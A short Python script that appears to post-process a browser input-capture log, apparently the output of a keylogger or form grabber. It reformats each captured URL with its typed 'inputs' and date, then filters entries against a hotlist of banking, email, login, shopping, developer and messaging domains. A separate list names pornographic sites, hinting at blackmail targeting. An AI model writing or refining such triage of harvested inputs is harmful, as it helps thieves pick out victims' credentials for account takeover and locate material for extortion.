import json as js

with open('feaLog.json', 'rb') as file:
    data = js.load(file)

with open('BetterLog.log', 'wb') as file:
    for d in data:
        url = f"{d['url']['domain'] + d['url']['tld'] + d['url']['frag'] + d['url']['path']}"
        file.write(bytes(f"[ {url} {d['inputs']} {d['timestamp'][:10]} ]\n", 'utf-8'))

domain_hotlist = [
    'google', 'mail', 'online', 'outlook', 'facebook',
    'banco', 'bank', 'bra', 'login', 'mercado', 'youtube',
    'xfantazy', 'xvideos', 'pornhub', 'hotmart', 'detran',
    'store', 'amazon', 'account', 'jus', 'baidata', 'intagram',
    'github', 'discord', 'telegram', 'mec', 'uf', 'clear', 'xp',
    'invest', 'loja', 'udemy']

domain_hootlist = ['xfantazy', 'xvideos', 'pornhub']

with open('HotLog.log', 'wb') as file:
    for d in data:
        for name in domain_hotlist:
            if name in d['url']['domain']:
                url = f"{d['url']['domain'] + d['url']['tld'] + d['url']['frag'] + d['url']['path']}"
                file.write(bytes(f"[ {url} {d['inputs']} {d['timestamp'][:10]} ]\n", 'utf-8'))
                break
